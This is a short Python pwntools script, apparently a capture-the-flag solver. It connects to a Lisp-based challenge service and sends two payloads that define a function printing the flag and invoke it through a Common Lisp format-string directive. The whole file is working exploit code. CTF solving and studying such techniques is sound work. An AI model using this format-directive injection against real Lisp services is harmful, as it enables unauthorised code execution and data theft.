from pwn import *

context.log_level = "error"

host = args.HOST if args.HOST else "localhost"
port = args.PORT if args.PORT else 1337
ssl = args.SSL if args.SSL else None
team_token = args.TOKEN if args.TOKEN else None

r = remote(host=host, port=port, ssl=ssl)

if team_token:
    r.sendlineafter(b"enter your team token: ", team_token.encode())

exploit = [
    b"(! printer (a) (lambda (b) (lambda (c) (lambda (d) (princ *flag*)))))",
    b'(format nil "~/printer/" nil)'
]

for e in exploit:
    r.sendlineafter(b">>> ", e)

# r.interactive()
print(r.recvline().strip().decode())
